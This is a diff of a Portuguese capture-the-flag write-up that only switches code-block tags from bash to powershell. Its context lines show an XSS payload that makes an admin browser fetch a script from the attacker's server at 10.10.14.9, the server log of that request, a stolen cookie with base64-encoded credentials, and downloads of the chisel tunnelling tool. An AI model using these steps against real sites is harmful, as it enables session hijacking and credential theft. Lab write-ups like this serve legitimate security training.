@@ -79,7 +79,7 @@ Já que, aparentemente, esta máquina está a dizer que um administrator irá ab
 
 Esse código faz com que, se existir a tal vulnerabilidade, o browser por onde o administrador simulado abre a transação, execute esse código javascript, que por sua vez tenta adquirir um outro ficheiro denominado test.js localizado em http://10.10.14.9/. É claro que para verificar se o código é executado, é necessário disponibilizar este serviço http:
 
-```bash
+```powershell
 sudo python3 -m http.server 80
 #>  10.10.10.154 - - [13/Sep/2021 12:12:58] code 404, message File not found
 #>  10.10.10.154 - - [13/Sep/2021 12:12:58] "GET /test.js HTTP/1.1" 404 -
@@ -99,7 +99,7 @@ request.send()
 
 Na imagem, é possível ver o cookie de um usuário (supostamente administrador pelo que o alerta nos informou). Esse cookie está "encoded". Primeiro podemos reverter o "urlencoded" com ajuda do php em modo interativo. O resultado é o seguinte:
 
-```bash
+```powershell
 username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==; id=1
 ```
 
@@ -264,7 +264,7 @@ Para isso, irei utilizar o chisel do jpillora (https://github.com/jpillora/chise
 
 Enviar o chisel windows para a máquina alvo, e guarda a versão linux na minha máquina
 
-```bash
+```powershell
 wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
 wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz
 
